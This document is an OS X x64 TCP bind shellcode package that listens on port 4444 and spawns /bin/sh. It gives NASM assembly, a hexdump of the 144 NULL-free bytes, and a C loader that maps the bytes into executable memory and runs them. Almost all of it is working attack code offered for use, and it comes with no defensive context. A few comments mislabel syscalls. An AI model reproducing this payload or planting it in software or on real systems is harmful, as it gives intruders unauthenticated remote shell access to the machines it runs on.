;OS X x64, TCP bind shellcode (port 4444), NULL byte free, 144 bytes long
;ASM code
;compile:
;nasm -f macho64 bind-shellcode.asm
;ld -macosx_version_min 10.7.0 -o bindsc bind-shellcode.o

BITS 64

global start

section .text

;Argument order: rdi, rsi, rdx, rcx


start:
	;socket
	xor     rdi,rdi					;zero out RSI
	mov     dil, 0x2				;AF_INET = 2
	xor     rsi,rsi					;zero out RSI
	mov     sil, 0x1				;SOCK_STREAM = 1
	xor     rdx, rdx				;protocol = IP = 0

	;store syscall number on RAX
	xor     rax,rax					;zero out RAX
	mov     al,2					;put 2 to AL -> RAX = 0x0000000000000002
	ror     rax, 0x28				;rotate the 2 -> RAX = 0x0000000002000000
	mov     al,0x61					;move 3b to AL (execve socket#) -> RAX = 0x0000000002000061
	mov		r12, rax				;save RAX
    syscall							;trigger syscall

    ;bind
    mov		r9, rax					;save socket number
    mov 	rdi, rax				;put return value to RDI int socket
    xor		rsi, rsi				;zero out RSI
    push	rsi						;push RSI to the stack
    mov		esi, 0x5c110201			;port number 4444 (=0x115c)
    sub		esi,1					;make ESI=0x5c110200
    push	rsi						;push RSI to the stack
    mov 	rsi, rsp				;store address
    mov		dl,0x10					;length of socket structure 0x10
    add		r12b, 0x7				;RAX = 0x0000000002000068 bind
    mov		rax, r12				;restore RAX
    syscall

    ;listen
    ;RDI already contains the socket number
    xor		rsi, rsi				;zero out RSI
	inc		rsi						;backlog = 1
    add		r12b, 0x2				;RAX = 0x000000000200006a listen
    mov		rax, r12				;restore RAX
    syscall

    ;accept 30	AUE_ACCEPT	ALL	{ int accept(int s, caddr_t name, socklen_t	*anamelen); }
    ;RDI already contains the socket number
    xor		rsi, rsi				;zero out RSI
	;RDX is already zero
    sub		r12b, 0x4c				;RAX = 0x000000000200001e accept
    mov		rax, r12				;restore RAX
    syscall

    ;int dup2(u_int from, u_int to);
	mov		rdi, rax
	xor		rsi, rsi
	add		r12b, 0x3c				;RAX = 0x000000000200005a dup2
    mov		rax, r12				;restore RAX
    syscall

    inc		rsi
    mov 	rax, r12				;restore RAX
    syscall

	xor     rsi,rsi					;zero out RSI
	push    rsi						;push NULL on stack
	mov     rdi, 0x68732f6e69622f2f	;mov //bin/sh string to RDI (reverse)
	push    rdi						;push rdi to the stack
	mov     rdi, rsp				;store RSP (points to the command string) in RDI
	xor     rdx, rdx				;zero out RDX

	sub		r12b, 0x1f				;RAX = 0x000000000200003b execve
    mov		rax, r12				;restore RAX
    syscall							;trigger syscall

/*
$ nasm -f bin bind-shellcode.asm
$ hexdump bind-shellcode
0000000 48 31 ff 40 b7 02 48 31 f6 40 b6 01 48 31 d2 48
0000010 31 c0 b0 02 48 c1 c8 28 b0 61 49 89 c4 0f 05 49
0000020 89 c1 48 89 c7 48 31 f6 56 be 01 02 11 5c 83 ee
0000030 01 56 48 89 e6 b2 10 41 80 c4 07 4c 89 e0 0f 05
0000040 48 31 f6 48 ff c6 41 80 c4 02 4c 89 e0 0f 05 48
0000050 31 f6 41 80 ec 4c 4c 89 e0 0f 05 48 89 c7 48 31
0000060 f6 41 80 c4 3c 4c 89 e0 0f 05 48 ff c6 4c 89 e0
0000070 0f 05 48 31 f6 56 48 bf 2f 2f 62 69 6e 2f 73 68
0000080 57 48 89 e7 48 31 d2 41 80 ec 1f 4c 89 e0 0f 05
0000090
*/

//C code
//compile:
//gcc bind-shellcode.c -o bindsc

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x48" \
"\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x61\x49\x89\xc4\x0f\x05\x49" \
"\x89\xc1\x48\x89\xc7\x48\x31\xf6\x56\xbe\x01\x02\x11\x5c\x83\xee" \
"\x01\x56\x48\x89\xe6\xb2\x10\x41\x80\xc4\x07\x4c\x89\xe0\x0f\x05" \
"\x48\x31\xf6\x48\xff\xc6\x41\x80\xc4\x02\x4c\x89\xe0\x0f\x05\x48" \
"\x31\xf6\x41\x80\xec\x4c\x4c\x89\xe0\x0f\x05\x48\x89\xc7\x48\x31" \
"\xf6\x41\x80\xc4\x3c\x4c\x89\xe0\x0f\x05\x48\xff\xc6\x4c\x89\xe0" \
"\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68" \
"\x57\x48\x89\xe7\x48\x31\xd2\x41\x80\xec\x1f\x4c\x89\xe0\x0f\x05";

int main(int argc, char **argv) {

    void *ptr = mmap(0, 0x90, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}